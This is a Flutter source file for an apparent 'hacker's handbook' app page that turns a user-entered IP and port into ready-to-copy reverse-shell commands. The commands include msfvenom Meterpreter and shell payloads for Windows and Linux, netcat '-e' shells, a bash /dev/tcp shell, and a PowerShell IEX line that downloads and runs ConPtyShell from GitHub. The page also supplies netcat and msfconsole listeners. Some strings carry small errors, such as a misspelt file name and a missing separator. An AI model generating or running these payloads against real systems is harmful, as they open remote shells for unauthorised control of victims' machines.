import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:hackers_handbook/components/navbar.dart';

class Anasayfa extends StatefulWidget {
  const Anasayfa({super.key});

  @override
  State<Anasayfa> createState() => _AnasayfaState();
}

class _AnasayfaState extends State<Anasayfa> {
  late TextEditingController ipcontroller;
  late TextEditingController portcontroller;
  late String listener = "";
  late String windowsPayloadCode = "";
  late String linuxPayloadCode = "";

  late String listenerCode = "";
  String ip = "";
  String port = "";

  @override
  void initState() {
    super.initState();
    ipcontroller = TextEditingController();
    portcontroller = TextEditingController();
  }

  @override
  void dispose() {
    ipcontroller.dispose();
    portcontroller.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.grey.shade300,
      appBar: AppBar(
        centerTitle: true,
        title: Text(
          "Reverse Shells",
          style: TextStyle(
              fontSize: 30, fontWeight: FontWeight.w600, color: Colors.black),
        ),
        elevation: 0,
        backgroundColor: Colors.grey,
      ),
      drawer: Navbar(),
      body: ListView(
        scrollDirection: Axis.vertical,
        children: [
          Container(
            child: Column(
              children: [
                // Text("Reverse Shells", style: TextStyle(fontSize: 40, fontWeight: FontWeight.w600),),
                Padding(
                  padding: const EdgeInsets.all(20.0),
                  child: Container(
                    decoration: BoxDecoration(
                        color: Colors.black87,
                        borderRadius: BorderRadius.circular(20),
                        boxShadow: [
                          BoxShadow(
                              offset: Offset(5, 5),
                              color: Colors.grey,
                              blurRadius: 15,
                              spreadRadius: 5)
                        ]),
                    child: Padding(
                      padding: const EdgeInsets.all(20.0),
                      child: Column(
                        children: [
                          Container(
                            decoration: BoxDecoration(
                                color: Colors.white,
                                borderRadius: BorderRadius.circular(10)),
                            child: Padding(
                              padding: const EdgeInsets.only(
                                  left: 200.0,
                                  right: 200.0,
                                  top: 20.0,
                                  bottom: 20.0),
                              child: Column(
                                children: [
                                  Text(
                                    "Ip & Port",
                                    style: TextStyle(
                                        fontSize: 30,
                                        fontWeight: FontWeight.w600),
                                  ),
                                  SizedBox(
                                    height: 20,
                                  ),
                                  TextField(
                                    maxLines: 1,
                                    decoration: InputDecoration(
                                        border: OutlineInputBorder(),
                                        isDense: true,
                                        labelText: "Ip",
                                        contentPadding: EdgeInsets.all(20)),
                                    controller: ipcontroller,
                                    // onSubmitted: (String value) {
                                    //   setState(() {
                                    //     ip = ipcontroller.text;
                                    //   });
                                    // },
                                  ),
                                  SizedBox(
                                    height: 20,
                                  ),
                                  TextField(
                                    maxLines: 1,
                                    decoration: InputDecoration(
                                        border: OutlineInputBorder(),
                                        isDense: true,
                                        labelText: "Port",
                                        contentPadding: EdgeInsets.all(20)),
                                    controller: portcontroller,
                                    onSubmitted: (String value) {
                                      setState(() {
                                        ip = ipcontroller.text;
                                        port = portcontroller.text;
                                      });
                                    },
                                  ),
                                  SizedBox(
                                    height: 20,
                                  ),
                                  ElevatedButton(
                                      onPressed: () {
                                        setState(() {
                                          ip = ipcontroller.text;
                                          port = portcontroller.text;
                                        });
                                      },
                                      child: Text("Submit")),
                                ],
                              ),
                            ),
                          ),
                          SizedBox(
                            height: 20,
                          ),
                          Container(
                            width: double.infinity,
                            // width: MediaQuery.of(context).size.width / 3 + 20,
                            // height: MediaQuery.of(context).size.height / 3,
                            decoration: BoxDecoration(
                              color: Colors.white,
                              borderRadius: BorderRadius.circular(10),
                            ),
                            child: Column(
                              children: [
                                SizedBox(
                                  height: 20,
                                ),
                                Text(
                                  "Listener",
                                  style: TextStyle(
                                      fontSize: 30,
                                      fontWeight: FontWeight.w600),
                                ),
                                Padding(
                                  padding: const EdgeInsets.only(
                                      top: 40.0,
                                      bottom: 40.0,
                                      left: 200.0,
                                      right: 200.0),
                                  child: DropdownMenu(
                                    onSelected: (value) {
                                      if (value != null) {
                                        setState(() {
                                          listener = value;
                                        });
                                      }
                                    },
                                    dropdownMenuEntries: <DropdownMenuEntry<
                                        String>>[
                                      DropdownMenuEntry(
                                          value: "nc -lvnp $port",
                                          label: "netcat"),
                                      DropdownMenuEntry(
                                          value: listenerCode,
                                          label: "metasploit")
                                    ],
                                  ),
                                ),
                                SizedBox(
                                  height: 10,
                                ),
                                Padding(
                                  padding: const EdgeInsets.all(10.0),
                                  child: SelectableText(
                                    listener,
                                    style: TextStyle(
                                        color: Colors.black, fontSize: 20),
                                  ),
                                ),
                                SizedBox(
                                  height: 10,
                                )
                              ],
                            ),
                          ),
                          SizedBox(
                            height: 20,
                          ),
                          Container(
                            decoration: BoxDecoration(
                                color: Colors.white,
                                borderRadius: BorderRadius.circular(10)),
                            child: Column(
                              children: [
                                Text(
                                  "Windows",
                                  style: TextStyle(
                                      fontSize: 30,
                                      fontWeight: FontWeight.w600),
                                ),
                                Row(
                                  mainAxisAlignment:
                                      MainAxisAlignment.spaceEvenly,
                                  children: [
                                    Container(
                                      height: 300,
                                      child: Padding(
                                        padding: const EdgeInsets.all(10.0),
                                        child: SingleChildScrollView(
                                          child: Column(
                                            children: [
                                              SizedBox(
                                                height: 5,
                                              ),
                                              SizedBox(
                                                width: 300,
                                                height: 75,
                                                child: ElevatedButton(
                                                    style: ButtonStyle(
                                                        backgroundColor:
                                                            MaterialStatePropertyAll(
                                                                Colors.black)),
                                                    child: Text(
                                                        "Windows Meterpreter Staged Reverse TCP (x64)",
                                                        style: TextStyle(
                                                            color:
                                                                Colors.white)),
                                                    onPressed: () {
                                                      setState(() {
                                                        windowsPayloadCode =
                                                            "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f exe -o paylaod.exe";
                                                        listenerCode =
                                                            "msfconsole -q -x \"use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost $ip; set lport $port; exploit\"";
                                                      });
                                                    }),
                                              ),
                                              SizedBox(
                                                height: 5,
                                              ),
                                              SizedBox(
                                                width: 300,
                                                height: 75,
                                                child: ElevatedButton(
                                                    style: ButtonStyle(
                                                        backgroundColor:
                                                            MaterialStatePropertyAll(
                                                                Colors.black)),
                                                    child: Text(
                                                        "Windows Meterpreter Stageless Reverse TCP (x64)",
                                                        style: TextStyle(
                                                            color:
                                                                Colors.white)),
                                                    onPressed: () {
                                                      setState(() {
                                                        windowsPayloadCode =
                                                            "msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=$ip LPORT=$port -f exe -o payload.exe";
                                                        listenerCode =
                                                            "msfconsole -q -x \"use multi/handler; set payload windows/x64/meterpreter_reverse_tcp; set lhost $ip; set lport $port exploit\"";
                                                      });
                                                    }),
                                              ),
                                              SizedBox(
                                                height: 5,
                                              ),
                                              SizedBox(
                                                width: 300,
                                                height: 75,
                                                child: ElevatedButton(
                                                    style: ButtonStyle(
                                                        backgroundColor:
                                                            MaterialStatePropertyAll(
                                                                Colors.black)),
                                                    child: Text(
                                                        "Windows Staged Reverse TCP (x64)",
                                                        style: TextStyle(
                                                            color:
                                                                Colors.white)),
                                                    onPressed: () {
                                                      setState(() {
                                                        windowsPayloadCode =
                                                            "msfvenom -p windows/x64/shell/reverse_tcp LHOST=$ip LPORT=$port -f exe -o payload.exe";
                                                        listenerCode =
                                                            "msfconsole -q -x \"use multi/handler; set payload windows/x64/shell/reverse_tcp; set lhost $ip; set lport $port; exploit\"";
                                                      });
                                                    }),
                                              ),
                                              SizedBox(
                                                height: 5,
                                              ),
                                              SizedBox(
                                                width: 300,
                                                height: 75,
                                                child: ElevatedButton(
                                                    style: ButtonStyle(
                                                        backgroundColor:
                                                            MaterialStatePropertyAll(
                                                                Colors.black)),
                                                    child: Text(
                                                        "Windows Stageless Reverse TCP (x64)",
                                                        style: TextStyle(
                                                            color:
                                                                Colors.white)),
                                                    onPressed: () {
                                                      setState(() {
                                                        windowsPayloadCode =
                                                            "msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ip LPORT=$port -f exe -o payload.exe";
                                                        listenerCode =
                                                            "msfconsole -q -x \"use multi/handler; set payload windows/x64/shell_reverse_tcp; set lhost $ip; set lport $port; exploit\"";
                                                      });
                                                    }),
                                              ),
                                              SizedBox(
                                                height: 5,
                                              ),
                                              SizedBox(
                                                width: 300,
                                                height: 75,
                                                child: ElevatedButton(
                                                    style: ButtonStyle(
                                                        backgroundColor:
                                                            MaterialStatePropertyAll(
                                                                Colors.black)),
                                                    child: Text("nc.exe -e",
                                                        style: TextStyle(
                                                            color:
                                                                Colors.white)),
                                                    onPressed: () {
                                                      setState(() {
                                                        windowsPayloadCode =
                                                            "nc.exe $ip $port -e sh";
                                                        listenerCode =
                                                            "nc -lvnp $port";
                                                      });
                                                    }),
                                              ),
                                              SizedBox(
                                                height: 5,
                                              ),
                                              SizedBox(
                                                width: 300,
                                                height: 75,
                                                child: ElevatedButton(
                                                    style: ButtonStyle(
                                                        backgroundColor:
                                                            MaterialStatePropertyAll(
                                                                Colors.black)),
                                                    child: Text("ncat.exe -e",
                                                        style: TextStyle(
                                                            color:
                                                                Colors.white)),
                                                    onPressed: () {
                                                      setState(() {
                                                        windowsPayloadCode =
                                                            "ncat.exe $ip $port -e sh";
                                                        listenerCode =
                                                            "nc -lvnp $port";
                                                      });
                                                    }),
                                              ),
                                              SizedBox(
                                                height: 5,
                                              ),
                                              SizedBox(
                                                width: 300,
                                                height: 75,
                                                child: ElevatedButton(
                                                    style: ButtonStyle(
                                                        backgroundColor:
                                                            MaterialStatePropertyAll(
                                                                Colors.black)),
                                                    child: Text(
                                                      "Windows ConPty",
                                                      style: TextStyle(
                                                          color: Colors.white),
                                                    ),
                                                    onPressed: () {
                                                      setState(() {
                                                        windowsPayloadCode =
                                                            "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell $ip $port";
                                                        listenerCode =
                                                            "nc -lvnp $port";
                                                      });
                                                    }),
                                              ),
                                            ],
                                          ),
                                        ),
                                      ),
                                    ),
                                    Container(
                                      width:
                                          MediaQuery.of(context).size.width / 3,
                                      decoration: BoxDecoration(
                                          color: Colors.black,
                                          borderRadius:
                                              BorderRadius.circular(5)),
                                      child: Padding(
                                        padding: const EdgeInsets.all(10.0),
                                        child: SelectableText(
                                          windowsPayloadCode,
                                          style: TextStyle(color: Colors.white),
                                        ),
                                      ),
                                    )
                                  ],
                                )
                              ],
                            ),
                          ),
                          SizedBox(
                            height: 20,
                          ),
                          Container(
                            decoration: BoxDecoration(
                                color: Colors.white,
                                borderRadius: BorderRadius.circular(10)),
                            child: Column(
                              children: [
                                Text(
                                  "Linux",
                                  style: TextStyle(
                                      fontSize: 30,
                                      fontWeight: FontWeight.w600),
                                ),
                                Row(
                                  mainAxisAlignment:
                                      MainAxisAlignment.spaceEvenly,
                                  children: [
                                    Container(
                                      height: 300,
                                      child: Padding(
                                        padding: const EdgeInsets.all(10.0),
                                        child: SingleChildScrollView(
                                          child: Column(
                                            children: [
                                              SizedBox(
                                                height: 5,
                                              ),
                                              SizedBox(
                                                width: 300,
                                                height: 75,
                                                child: ElevatedButton(
                                                    style: ButtonStyle(
                                                        backgroundColor:
                                                            MaterialStatePropertyAll(
                                                                Colors.black)),
                                                    child: Text("Bash",
                                                        style: TextStyle(
                                                            color:
                                                                Colors.white)),
                                                    onPressed: () {
                                                      setState(() {
                                                        linuxPayloadCode =
                                                            "bash -c 'exec bash -i &>/dev/tcp/$ip/$port <&1'";
                                                        listenerCode =
                                                            "nc -lvnp $port";
                                                      });
                                                    }),
                                              ),
                                              SizedBox(
                                                height: 5,
                                              ),
                                              SizedBox(
                                                width: 300,
                                                height: 75,
                                                child: ElevatedButton(
                                                    style: ButtonStyle(
                                                        backgroundColor:
                                                            MaterialStatePropertyAll(
                                                                Colors.black)),
                                                    child: Text("netcat",
                                                        style: TextStyle(
                                                            color:
                                                                Colors.white)),
                                                    onPressed: () {
                                                      setState(() {
                                                        linuxPayloadCode =
                                                            "nc $ip $port -e /bin/bash";
                                                        listenerCode =
                                                            "nc -lvnp $port";
                                                      });
                                                    }),
                                              ),
                                              SizedBox(
                                                height: 5,
                                              ),
                                              SizedBox(
                                                width: 300,
                                                height: 75,
                                                child: ElevatedButton(
                                                    style: ButtonStyle(
                                                        backgroundColor:
                                                            MaterialStatePropertyAll(
                                                                Colors.black)),
                                                    child: Text(
                                                        "Linux Meterpreter Staged Reverse TCP (x64)",
                                                        style: TextStyle(
                                                            color:
                                                                Colors.white)),
                                                    onPressed: () {
                                                      setState(() {
                                                        linuxPayloadCode =
                                                            "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f elf -o payload.elf";
                                                        listenerCode =
                                                            "msfconsole -q -x \"use multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set lhost $ip; set lport $port; exploit\"";
                                                      });
                                                    }),
                                              ),
                                              SizedBox(
                                                height: 5,
                                              ),
                                              SizedBox(
                                                width: 300,
                                                height: 75,
                                                child: ElevatedButton(
                                                    style: ButtonStyle(
                                                        backgroundColor:
                                                            MaterialStatePropertyAll(
                                                                Colors.black)),
                                                    child: Text(
                                                        "Linux Stageless Reverse TCP (x64)",
                                                        style: TextStyle(
                                                            color:
                                                                Colors.white)),
                                                    onPressed: () {
                                                      setState(() {
                                                        linuxPayloadCode =
                                                            "msfvenom -p linux/x64/shell_reverse_tcp LHOST=$ip LPORT=$port -f elf -o payload.elf";
                                                        listenerCode =
                                                            "msfconsole -q -x \"use multi/handler; set payload linux/x64/shell_reverse_tcp; set lhost $ip; set lport $port; exploit\"";
                                                      });
                                                    }),
                                              ),
                                              SizedBox(
                                                height: 5,
                                              ),
                                              SizedBox(
                                                width: 300,
                                                height: 75,
                                                child: ElevatedButton(
                                                    style: ButtonStyle(
                                                        backgroundColor:
                                                            MaterialStatePropertyAll(
                                                                Colors.black)),
                                                    child: Text(
                                                        "Python Stageless Reverse TCP",
                                                        style: TextStyle(
                                                            color:
                                                                Colors.white)),
                                                    onPressed: () {
                                                      setState(() {
                                                        linuxPayloadCode =
                                                            "msfvenom -p cmd/unix/reverse_python LHOST=$ip LPORT=$port -f raw";
                                                        listener =
                                                            "msfconsole -q -x \"use multi/handler; set payload cmd/unix/reverse_python; set lhost $ip; set lport $port; exploit\"";
                                                      });
                                                    }),
                                              ),
                                              SizedBox(
                                                height: 5,
                                              ),
                                              SizedBox(
                                                width: 300,
                                                height: 75,
                                                child: ElevatedButton(
                                                    style: ButtonStyle(
                                                        backgroundColor:
                                                            MaterialStatePropertyAll(
                                                                Colors.black)),
                                                    child: Text(
                                                        "Bash Stageless Reverse TCP",
                                                        style: TextStyle(
                                                            color:
                                                                Colors.white)),
                                                    onPressed: () {
                                                      setState(() {
                                                        linuxPayloadCode =
                                                            "msfvenom -p cmd/unix/reverse_bash LHOST=$ip LPORT=$port -f raw -o shell.sh";
                                                        listener =
                                                            "msfconsole -q -x \"use multi/handler; set payload cmd/unix/reverse_bash; set lhost $ip; set lport $port; exploit\"";
                                                      });
                                                    }),
                                              ),
                                            ],
                                          ),
                                        ),
                                      ),
                                    ),
                                    Container(
                                      width:
                                          MediaQuery.of(context).size.width / 3,
                                      decoration: BoxDecoration(
                                          color: Colors.black,
                                          borderRadius:
                                              BorderRadius.circular(5)),
                                      child: Padding(
                                        padding: const EdgeInsets.all(10.0),
                                        child: SelectableText(
                                          linuxPayloadCode,
                                          style: TextStyle(color: Colors.white),
                                        ),
                                      ),
                                    )
                                  ],
                                )
                              ],
                            ),
                          ),
                          SizedBox(
                            height: 20,
                          ),
                          Container(
                            width: double.infinity,
                            decoration: BoxDecoration(
                              color: Colors.white,
                              borderRadius: BorderRadius.circular(10)

                            ),
                            child: Padding(
                              padding: const EdgeInsets.all(20.0),
                              child: Center(child: Text("Don't forget to use \"chmod +x payloadName\"", style: TextStyle(fontSize: 20, fontWeight: FontWeight.w600),)),
                            ),
                          )
                        ],
                      ),
                    ),
                  ),
                )
              ],
            ),
          ),
        ],
      ),
    );
  }
}
